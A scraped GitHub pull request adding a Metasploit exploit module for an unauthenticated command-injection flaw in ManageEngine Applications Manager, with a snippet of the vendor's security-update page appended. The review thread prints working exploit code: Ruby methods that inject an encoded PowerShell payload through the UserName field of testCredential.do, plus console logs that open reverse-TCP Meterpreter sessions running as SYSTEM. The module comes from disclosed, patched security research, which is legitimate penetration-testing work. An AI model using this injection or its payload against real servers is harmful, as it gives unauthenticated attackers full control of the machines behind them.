[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Adding ManageEngine Application Manager RCE #9684

 Merged

[wchen-r7](/wchen-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[mdisec:manageengine\_appmanager\_0day](/mdisec/metasploit-framework/tree/manageengine_appmanager_0day "mdisec/metasploit-framework:manageengine_appmanager_0day")

Mar 27, 2018

 Merged

# [Adding ManageEngine Application Manager RCE](#top) #9684

[wchen-r7](/wchen-r7)
merged 7 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[mdisec:manageengine\_appmanager\_0day](/mdisec/metasploit-framework/tree/manageengine_appmanager_0day "mdisec/metasploit-framework:manageengine_appmanager_0day")

Mar 27, 2018

[Conversation
21](/rapid7/metasploit-framework/pull/9684)
[Commits
7](/rapid7/metasploit-framework/pull/9684/commits)
[Checks
0](/rapid7/metasploit-framework/pull/9684/checks)
[Files changed](/rapid7/metasploit-framework/pull/9684/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![mdisec](https://avatars.githubusercontent.com/u/4004716?s=60&v=4)](/mdisec)

Copy link

Contributor

### @mdisec **[mdisec](/mdisec)** commented [Mar 7, 2018](#issue-303257277) ‚Ä¢ edited by wchen-r7 Loading

This module exploits command injection vulnerability -0day as far as I know- in the ManageEngine Application Manager product. An unauthenticated user can execute a operating system command under the context of privileged user.

A successful check of the exploit will look like this:

* Start `msfconsole`
* `use exploit/linux/http/securityonion_xplico_exec`
* Set `RHOST`
* Set `PAYLOAD windows/meterpreter/reverse_tcp`
* Set `LHOST`
* Run `check`
* **Verify** that you are seeing `The target is vulnerable.` in console.
* Run `exploit`
* **Verify** that you are seeing `Triggering the vulnerability` in console.
* **Verify** that you are seeing `Sending stage (179779 bytes) to <TARGET>` in console.
* **Verify** that you have your shell.

## Scenarios

```
msf5 >
msf5 > use exploit/windows/http/manageengine_appmanager_exec
msf5 exploit(windows/http/manageengine_appmanager_exec) > set RHOST 12.0.0.192
RHOST => 12.0.0.192
msf5 exploit(windows/http/manageengine_appmanager_exec) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/manageengine_appmanager_exec) > set LHOST 12.0.0.1
LHOST => 12.0.0.1
msf5 exploit(windows/http/manageengine_appmanager_exec) > check
[+] 12.0.0.192:9090 The target is vulnerable.
msf5 exploit(windows/http/manageengine_appmanager_exec) > run

[*] Started reverse TCP handler on 12.0.0.1:4444
[*] Trigerring the vulnerability
[*] Sending stage (179779 bytes) to 12.0.0.192

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

**Technical Details and Module Demo**

<https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/>

Sorry, something went wrong.

 üëç
1
 omarkurt reacted with thumbs up emoji
 üéâ
1
 omarkurt reacted with hooray emoji
 ‚ù§Ô∏è
1
 omarkurt reacted with heart emoji

All reactions

* üëç
  1 reaction
* üéâ
  1 reaction
* ‚ù§Ô∏è
  1 reaction

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Adding ManageEngine Application Manager RCE](/rapid7/metasploit-framework/pull/9684/commits/611b20826754a1d3f33dbb0585b7da2c6583363a "Adding ManageEngine Application Manager RCE")`

`[611b208](/rapid7/metasploit-framework/pull/9684/commits/611b20826754a1d3f33dbb0585b7da2c6583363a)`

[![@jmartin-tech](https://avatars.githubusercontent.com/u/7873740?s=40&u=761d485098432a30044aa248045cd6d7573482c0&v=4)](/jmartin-tech)
[jmartin-tech](/jmartin-tech)
added
[module](/rapid7/metasploit-framework/labels/module)
[docs](/rapid7/metasploit-framework/labels/docs)
labels
[Mar 7, 2018](#event-1509901822)

 [![@jmartin-tech](https://avatars.githubusercontent.com/u/7873740?s=40&u=761d485098432a30044aa248045cd6d7573482c0&v=4)](/jmartin-tech)
[jmartin-tech](/jmartin-tech)
requested a review
from [todb-r7](/todb-r7)
[March 7, 2018 21:41](#event-1509907998)

 [mdisec](/mdisec)
added 2 commits
[March 9, 2018 12:25](#commits-pushed-4b483e0)

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Adding assigned CVE number](/rapid7/metasploit-framework/pull/9684/commits/4b483e079b2cb50f5db7407ac3fc1c64b288398a "Adding assigned CVE number")`

`[4b483e0](/rapid7/metasploit-framework/pull/9684/commits/4b483e079b2cb50f5db7407ac3fc1c64b288398a)`

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Fixing rubocop errors](/rapid7/metasploit-framework/pull/9684/commits/2fd9b0b77bd5681d347046c93f28b056635d9285 "Fixing rubocop errors")`

`[2fd9b0b](/rapid7/metasploit-framework/pull/9684/commits/2fd9b0b77bd5681d347046c93f28b056635d9285)`

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Mar 12, 2018](#issuecomment-372487295) ‚Ä¢ edited Loading

| This was my first time to using rubocop. I don't know how to fix following erros.  ``` RuboCop: Layout/AlignParameters: Align the parameters of a method call if they span more than one line. [Layout/AlignParameters] RuboCop: Layout/ClosingParenthesisIndentation: Align `)` with `(`. [Layout/ClosingParenthesisIndentation] RuboCop: Layout/MultilineMethodCallBraceLayout: Closing method call brace must be on the same line as the last argument when opening brace is on the same line as the first argument. [Layout/MultilineMethodCallBraceLayout]  ```  Those errors are mostly related with indentation of parameters of `update_info` method such as name, description etc and position of `(` and `)`.  Any idea how to fix them too ? or ignore by updating .rubocop.yml file ? |
| --- |

All reactions

Sorry, something went wrong.

[![@wvu](https://avatars.githubusercontent.com/u/4551878?s=80&u=99426fa1baf3d6e40a669942251d846cf81a9c25&v=4)](/wvu)

Copy link

Contributor

### **[wvu](/wvu)** commented [Mar 12, 2018](#issuecomment-372496543)

| @mmetince: You can read about the layout cops at <https://rubocop.readthedocs.io/en/latest/cops_layout/>.  You can also read its parent doc at <https://github.com/bbatsov/ruby-style-guide>. Cheers! |
| --- |

 üëç
1
 mdisec reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Make the rubocop happy](/rapid7/metasploit-framework/pull/9684/commits/ec10a82c56e01c92983c6b8d6857221986aab32c "Make the rubocop happy")`

`[ec10a82](/rapid7/metasploit-framework/pull/9684/commits/ec10a82c56e01c92983c6b8d6857221986aab32c)`

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Mar 13, 2018](#issuecomment-372574211)

| Thanks [@wvu-r7](https://github.com/wvu-r7), I've solved em all. üëç Looking forward for review now ^^ |
| --- |

 üëç
1
 wvu reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
reviewed
[Mar 13, 2018](#pullrequestreview-103321174)

 [View reviewed changes](/rapid7/metasploit-framework/pull/9684/files/ec10a82c56e01c92983c6b8d6857221986aab32c)

[documentation/modules/exploit/windows/http/manageengine\_appmanager\_exec.md](/rapid7/metasploit-framework/pull/9684/files/ec10a82c56e01c92983c6b8d6857221986aab32c#diff-e5fadfcd469bc57dd17e83e160652d9214be147e1a9e065b15bcea4a4075f343)
Outdated

|  |  | Go to following website and download Windows version of the product. It comes with built-in Java and Postgresql so you don't need to install anything else. |
| --- | --- | --- |
|  |  | [https://www.manageengine.com/products/applications\_manager/download.html](https://www.manageengine.com/products/applications\_manager/download.html) |
|  |  |  |
|  |  | ## Verification Steps |

Copy link

Contributor

### @bcoles **[bcoles](/bcoles)** [Mar 13, 2018](#discussion_r174037778)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

These steps are a lie.

Consider:

```
1. Start `msfconsole`
2. `use exploit/windows/http/manageengine_appmanager_exec`
3. Set `RHOST <RHOST>`
4. Set `PAYLOAD windows/meterpreter/reverse_tcp`
5. Set `LHOST <LHOST>`
6. Run `check`
7. **Verify** that you are seeing `The target is vulnerable.` in console.
8. Run `exploit`
9. **Verify** that you are seeing `Triggering the vulnerability` in console.
10. **Verify** that you are seeing `Sending stage to <TARGET>` in console.
11. **Verify** that you have your shell.
```

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @mdisec **[mdisec](/mdisec)** [Mar 13, 2018](#discussion_r174052620)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Ups sorry. I forgot to update from another module.

Sorry, something went wrong.

All reactions

[modules/exploits/windows/http/manageengine\_appmanager\_exec.rb](/rapid7/metasploit-framework/pull/9684/files/ec10a82c56e01c92983c6b8d6857221986aab32c#diff-a581339c785445cf4395bd3d6228bc9d78ebcb56d45b37f7211827fe7e933ad0)
Outdated

|  |  | 'isAgentAssociated' => 'false', |
| --- | --- | --- |
|  |  | 'displayname' => Rex::Text.rand\_text\_alpha(10), |
|  |  | 'HostName' => '127.0.0.1', # Try to access random IP address or domain may trigger SIEMs or DLP systems... |
|  |  | 'Version' => '2013', |

Copy link

Contributor

### @bcoles **[bcoles](/bcoles)** [Mar 13, 2018](#discussion_r174038184)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Does `2013` need to be static?

Sorry, something went wrong.

All reactions

[modules/exploits/windows/http/manageengine\_appmanager\_exec.rb](/rapid7/metasploit-framework/pull/9684/files/ec10a82c56e01c92983c6b8d6857221986aab32c#diff-a581339c785445cf4395bd3d6228bc9d78ebcb56d45b37f7211827fe7e933ad0)
Outdated

|  |  | 'montype' => 'OfficeSharePointServer', |
| --- | --- | --- |
|  |  | 'isAgentEnabled' => 'NO', |
|  |  | 'isAgentAssociated' => 'false', |
|  |  | 'displayname' => Rex::Text.rand\_text\_alpha(10), |

Copy link

Contributor

### @bcoles **[bcoles](/bcoles)** [Mar 13, 2018](#discussion_r174038274)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Randomization for the win:

```
        'displayname' => Rex::Text.rand_text_alpha(rand(10..15)),
```

Sorry, something went wrong.

All reactions

[modules/exploits/windows/http/manageengine\_appmanager\_exec.rb](/rapid7/metasploit-framework/pull/9684/files/ec10a82c56e01c92983c6b8d6857221986aab32c#diff-a581339c785445cf4395bd3d6228bc9d78ebcb56d45b37f7211827fe7e933ad0)
Outdated

|  |  |  |
| --- | --- | --- |
|  |  | print\_status('Triggering the vulnerability') |
|  |  |  |
|  |  | send\_request\_cgi( |

Copy link

Contributor

### @bcoles **[bcoles](/bcoles)** [Mar 13, 2018](#discussion_r174038824)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Does the server return a response when exploitation is successful, or does triggering the payload cause the request to timeout?

If the server returns a response, it might be nice to validate the response and print an appropriate message.

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @mdisec **[mdisec](/mdisec)** [Mar 13, 2018](#discussion_r174054169)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Nope, since this command injection issue a request that exploits the vulnerability will be hanging on.

Sorry, something went wrong.

All reactions

[modules/exploits/windows/http/manageengine\_appmanager\_exec.rb](/rapid7/metasploit-framework/pull/9684/files/ec10a82c56e01c92983c6b8d6857221986aab32c#diff-a581339c785445cf4395bd3d6228bc9d78ebcb56d45b37f7211827fe7e933ad0)

|  |  | ) |
| --- | --- | --- |
|  |  | end |
|  |  |  |
|  |  | def check |

Copy link

Contributor

### @bcoles **[bcoles](/bcoles)** [Mar 13, 2018](#discussion_r174039207)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Perhaps I missed something, but it looks like the HTTP request in the `check` method and `exploit` method are almost identical, with the exception of the `UserName`.

You could create a new method which takes a `username` parameter and returns the result of the `send_request_cgi` call, then call this method from both the `check` method and `exploit` method.

Not required, but it's nice to be DRY :)

Something like this:

```
  def test_credential(username)
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'testCredential.do'),
      'vars_post' => {
        'method' => 'testCredentialForConfMonitors',
        'type' => 'OfficeSharePointServer',
        'montype' => 'OfficeSharePointServer',
        'isAgentEnabled' => 'NO',
        'isAgentAssociated' => 'false',
        'displayname' => Rex::Text.rand_text_alpha(rand(10..15)),
        'HostName' => '127.0.0.1', # Try to access random IP address or domain may trigger SIEMs or DLP systems...
        'Version' => '2013',
        'Powershell' => 'True', # :-)
        'CredSSP' => 'False',
        'SPType' => 'SPServer',
        'CredentialDetails' => 'nocm',
        'Password' => Rex::Text.rand_text_alpha(rand(3..10)),
        'UserName' => username
      }
    )
  end

  def check
    res = test_credential(Rex::Text.rand_text_alpha(rand(3..10)))

    unless res
      vprint_error('Connection failed')
      return CheckCode::Unknown
    end

    if res.body.include?('Kindly check the credentials and try again')
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    powershell_options = {
      encode_final_payload: true,
      remove_comspec: true
    }
    p = cmd_psh_payload(payload.encoded, payload_instance.arch.first, powershell_options)

    print_status('Triggering the vulnerability')

    test_credential("$(#{p})")
  end
```

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @mdisec **[mdisec](/mdisec)** [Mar 13, 2018](#discussion_r174055841)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Couldn't agree more. Done^^

Sorry, something went wrong.

 üëç
2
 bcoles and omarkurt reacted with thumbs up emoji

All reactions

* üëç
  2 reactions

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Updating documentation and minor code changes](/rapid7/metasploit-framework/pull/9684/commits/889c914b3dbede621ad3b55572b908f22e79be62 "Updating documentation and minor code changes")`

`[889c914](/rapid7/metasploit-framework/pull/9684/commits/889c914b3dbede621ad3b55572b908f22e79be62)`

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [Mar 13, 2018](#issuecomment-372830114)

| While letting the vendor know about this bug, I notice that their [bug bounty](https://bugbounty.zoho.com) calls it Application**s** Manager (note the plural). Just fyi. I wonder how many of our modules are incorrect. |
| --- |

All reactions

Sorry, something went wrong.

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [Mar 13, 2018](#issuecomment-372831549)

| There, let the vendor know, they're tracking it as ZVE-2018-0492, in case you haven't done this already, @mmetince |
| --- |

All reactions

Sorry, something went wrong.

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Mar 13, 2018](#issuecomment-372838081)

| [@todb-r7](https://github.com/todb-r7) thanks. It seem they released a patch. <https://pitstop.manageengine.com/portal/community/topic/security-vulnerability-issues-fixed-upgrade-to-the-latest-version-of-applications-manager> |
| --- |

All reactions

Sorry, something went wrong.

[![todb-r7](https://avatars.githubusercontent.com/u/1170909?s=60&v=4)](/todb-r7)

**[todb-r7](/todb-r7)**
approved these changes
[Mar 13, 2018](#pullrequestreview-103635540)

 [View reviewed changes](/rapid7/metasploit-framework/pull/9684/files/889c914b3dbede621ad3b55572b908f22e79be62)

Copy link

### @todb-r7 **[todb-r7](/todb-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Left a comment but it's a tiny nit to pick. We probably need to grep through the other modules for this inconsistency, so don't consider this a hold up.

Sorry, something went wrong.

All reactions

[modules/exploits/windows/http/manageengine\_appmanager\_exec.rb](/rapid7/metasploit-framework/pull/9684/files/889c914b3dbede621ad3b55572b908f22e79be62#diff-a581339c785445cf4395bd3d6228bc9d78ebcb56d45b37f7211827fe7e933ad0)

|  |  | super(update\_info(info, |
| --- | --- | --- |
|  |  | 'Name' => "ManageEngine Applications Manager Remote Code Execution", |
|  |  | 'Description' => %q( |
|  |  | This module exploits command injection vulnerability in the ManageEngine Application Manager product. |

Copy link

### @todb-r7 **[todb-r7](/todb-r7)** [Mar 13, 2018](#discussion_r174303584)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Should be Applications Manager, not Application Manager (apparently)

Sorry, something went wrong.

All reactions

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=80&u=1f864c7e50f9084003ce3e68dbb4f144773c8a2e&v=4)](/mdisec)

Copy link

Contributor

Author

### **[mdisec](/mdisec)** commented [Mar 13, 2018](#issuecomment-372849662)

| I will replace "application" with "applications", thank you very much [@todb-r7](https://github.com/todb-r7). Please let me know if I need to do other changes so I can fix them all within single commit. |
| --- |

All reactions

Sorry, something went wrong.

[![bcoles](https://avatars.githubusercontent.com/u/434827?s=60&v=4)](/bcoles)

**[bcoles](/bcoles)**
approved these changes
[Mar 14, 2018](#pullrequestreview-103699249)

 [View reviewed changes](/rapid7/metasploit-framework/pull/9684/files/889c914b3dbede621ad3b55572b908f22e79be62)

Copy link

Contributor

### @bcoles **[bcoles](/bcoles)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

A couple tiny nitpicks with the grammar in the description.

It may also be worth adding the

`[ 'BID' => '103358' ]`

and patch URL

`[ 'URL' => 'https://pitstop.manageengine.com/portal/community/topic/security-vulnerability-issues-fixed-upgrade-to-the-latest-version-of-applications-manager' ]`

to the `References` array.

Approved, but untested.

Sorry, something went wrong.

All reactions

 [mdisec](/mdisec)
added 2 commits
[March 14, 2018 11:51](#commits-pushed-b55a750)

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Fix typo and couple tiny nitpicks](/rapid7/metasploit-framework/pull/9684/commits/b55a750fa9d73cf63c61b9b92e7cb4bd0479ff16 "Fix typo and couple tiny nitpicks")`

`[b55a750](/rapid7/metasploit-framework/pull/9684/commits/b55a750fa9d73cf63c61b9b92e7cb4bd0479ff16)`

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=40&v=4)](/mdisec)

`[Update documentation and add check before exploit](/rapid7/metasploit-framework/pull/9684/commits/53eabfc1df43fa289bc800c697900dd43ee62ef4 "Update documentation and add check before exploit")`

`[53eabfc](/rapid7/metasploit-framework/pull/9684/commits/53eabfc1df43fa289bc800c697900dd43ee62ef4)`

[![@wchen-r7](https://avatars.githubusercontent.com/u/1170914?s=80&u=bcd94995d63a2806bb71f8c4dad1b767f6fd77a7&v=4)](/wchen-r7)

Copy link

Contributor

### **[wchen-r7](/wchen-r7)** commented [Mar 27, 2018](#issuecomment-376639308)

| Love ManageEngine vulns. |
| --- |

 ‚ù§Ô∏è
2
 wvu and mdisec reacted with heart emoji

All reactions

* ‚ù§Ô∏è
  2 reactions

Sorry, something went wrong.

[![@wchen-r7](https://avatars.githubusercontent.com/u/1170914?s=40&u=bcd94995d63a2806bb71f8c4dad1b767f6fd77a7&v=4)](/wchen-r7)
[wchen-r7](/wchen-r7)
self-assigned this
[Mar 27, 2018](#event-1544092803)

[![@wchen-r7](https://avatars.githubusercontent.com/u/1170914?s=80&u=bcd94995d63a2806bb71f8c4dad1b767f6fd77a7&v=4)](/wchen-r7)

Copy link

Contributor

### **[wchen-r7](/wchen-r7)** commented [Mar 27, 2018](#issuecomment-376659436)

| Works for me:  ``` msf5 exploit(windows/http/manageengine_appmanager_exec) > check [+] 172.16.249.180:9090 The target is vulnerable. msf5 exploit(windows/http/manageengine_appmanager_exec) > run  [*] Started reverse TCP handler on 172.16.249.1:4444  [*] Triggering the vulnerability [*] Sending stage (180291 bytes) to 172.16.249.180 [*] Meterpreter session 1 opened (172.16.249.1:4444 -> 172.16.249.180:50377) at 2018-03-27 15:13:14 -0500  ``` |
| --- |

 üëç
1
 mdisec reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@wchen-r7](https://avatars.githubusercontent.com/u/1170914?s=40&u=bcd94995d63a2806bb71f8c4dad1b767f6fd77a7&v=4)](/wchen-r7)
[wchen-r7](/wchen-r7)
merged commit [`53eabfc`](/rapid7/metasploit-framework/commit/53eabfc1df43fa289bc800c697900dd43ee62ef4)
into
rapid7:master

[Mar 27, 2018](https://github.com/rapid7/metasploit-framework/pull/9684#event-1544139675)

[wchen-r7](/wchen-r7)
added a commit
that referenced
this pull request
[Mar 27, 2018](#ref-commit-94fd599)
[![@wchen-r7](https://avatars.githubusercontent.com/u/1170914?s=40&u=bcd94995d63a2806bb71f8c4dad1b767f6fd77a7&v=4)](/wchen-r7)

`[Land](/rapid7/metasploit-framework/commit/94fd599756f3af4d0ed122c1bbe6dc54703cd3bf "Land #9684, Adding ManageEngine Application Manager RCE

Land #9684") [#9684](https://github.com/rapid7/metasploit-framework/pull/9684)[, Adding ManageEngine Application Manager RCE](/rapid7/metasploit-framework/commit/94fd599756f3af4d0ed122c1bbe6dc54703cd3bf "Land #9684, Adding ManageEngine Application Manager RCE

Land #9684")`
‚Ä¶

`[94fd599](/rapid7/metasploit-framework/commit/94fd599756f3af4d0ed122c1bbe6dc54703cd3bf)`

```
Land [#9684](https://github.com/rapid7/metasploit-framework/pull/9684)
```

[![@wchen-r7](https://avatars.githubusercontent.com/u/1170914?s=80&u=bcd94995d63a2806bb71f8c4dad1b767f6fd77a7&v=4)](/wchen-r7)

Copy link

Contributor

### **[wchen-r7](/wchen-r7)** commented [Mar 27, 2018](#issuecomment-376660747) ‚Ä¢ edited by allrosenthal-r7 Loading

| Release Notes The exploits/windows/http/manageengine\_appmanager\_exec module has been added to the framework. It exploits command injection vulnerability in the ManageEngine Application Manager product. An unauthenticated user can execute an operating system command under the context of a privileged user. |
| --- |

 üëç
1
 mdisec reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[msjenkins-r7](/msjenkins-r7)
pushed a commit
that referenced
this pull request
[Mar 27, 2018](#ref-commit-6108d79)
[![@wchen-r7](https://avatars.githubusercontent.com/u/1170914?s=40&u=bcd94995d63a2806bb71f8c4dad1b767f6fd77a7&v=4)](/wchen-r7) [![@msjenkins-r7](https://avatars.githubusercontent.com/u/5332090?s=40&v=4)](/msjenkins-r7)

`[Land](/rapid7/metasploit-framework/commit/6108d79dcd1d4e56eb54255d22924713895121d6 "Land #9684, Adding ManageEngine Application Manager RCE

Land #9684") [#9684](https://github.com/rapid7/metasploit-framework/pull/9684)[, Adding ManageEngine Application Manager RCE](/rapid7/metasploit-framework/commit/6108d79dcd1d4e56eb54255d22924713895121d6 "Land #9684, Adding ManageEngine Application Manager RCE

Land #9684")`
‚Ä¶

`[6108d79](/rapid7/metasploit-framework/commit/6108d79dcd1d4e56eb54255d22924713895121d6)`

```
Land [#9684](https://github.com/rapid7/metasploit-framework/pull/9684)
```

[![@allrosenthal-r7](https://avatars.githubusercontent.com/u/35977292?s=40&u=143f652a3d90e48bafeea6388a8067d578d869e6&v=4)](/allrosenthal-r7)
[allrosenthal-r7](/allrosenthal-r7)
added
the
[rn-exploit](/rapid7/metasploit-framework/labels/rn-exploit)
label
[Apr 10, 2018](#event-1567087887)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F9684)

Reviewers

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=40&v=4)](/todb-r7) [todb-r7](/todb-r7)

todb-r7 approved these changes

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=40&v=4)](/bcoles) [bcoles](/bcoles)

bcoles approved these changes

Assignees

[![@wchen-r7](https://avatars.githubusercontent.com/u/1170914?s=40&v=4)](/wchen-r7) [wchen-r7](/wchen-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

7 participants

[![@mdisec](https://avatars.githubusercontent.com/u/4004716?s=52&v=4)](/mdisec) [![@wvu](https://avatars.githubusercontent.com/u/4551878?s=52&v=4)](/wvu) [![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=52&v=4)](/todb-r7) [![@wchen-r7](https://avatars.githubusercontent.com/u/1170914?s=52&v=4)](/wchen-r7) [![@bcoles](https://avatars.githubusercontent.com/u/434827?s=52&v=4)](/bcoles) [![@jmartin-tech](https://avatars.githubusercontent.com/u/7873740?s=52&v=4)](/jmartin-tech) [![@allrosenthal-r7](https://avatars.githubusercontent.com/u/35977292?s=52&v=4)](/allrosenthal-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from www.manageengine.com_c350035e_20250126_041729.html ===


[Schedule demo](https://www.manageengine.com/products/applications_manager/demo.html?demorhsFixed)

[![Application Performance Monitoring - ManageEngine Applications Manager](../../../images/logo/applicationsmanager.svg "Application Performance Monitoring - ManageEngine Applications Manager")](../../applications_manager/)

[Download](../download.html "Download ManageEngine Applications Manager")

* [Overview](../../applications_manager/)
* [Features](../applications-monitoring-features.html)
* [Demo](../demo.html)
* [Get Quote](../get-quote.html)
* [Editions](../applications-manager-comparison.html)
* [Resources](../document.html)
  + [What's New](https://www.manageengine.com/products/applications_manager/document.html#whatsnew)
  + [Product Info](https://www.manageengine.com/products/applications_manager/document.html#productinfo)
  + [Blog / Articles](https://www.manageengine.com/products/applications_manager/document.html#blog-articles)
  + [White Papers / e-book](https://www.manageengine.com/products/applications_manager/document.html#whitepaper-ebook)
  + [Video](https://www.manageengine.com/products/applications_manager/document.html#video)
  + [Tech Topics](https://www.manageengine.com/products/applications_manager/document.html#techtopics)
* [Customers](../customer.html)
* [Support](../support.html)

## Security Updates - CVE Database

[Home](../../applications_manager/) ¬ª [Features](../applications-monitoring-features.html)

This page lists security vulnerability fixes made in various releases of Applications Manager and vulnerability details. Go to [ManageEngine's Security Response Center](https://www.manageengine.com/manageengine-security-response-center.html) to report vulnerabilities on ManageEngine products.

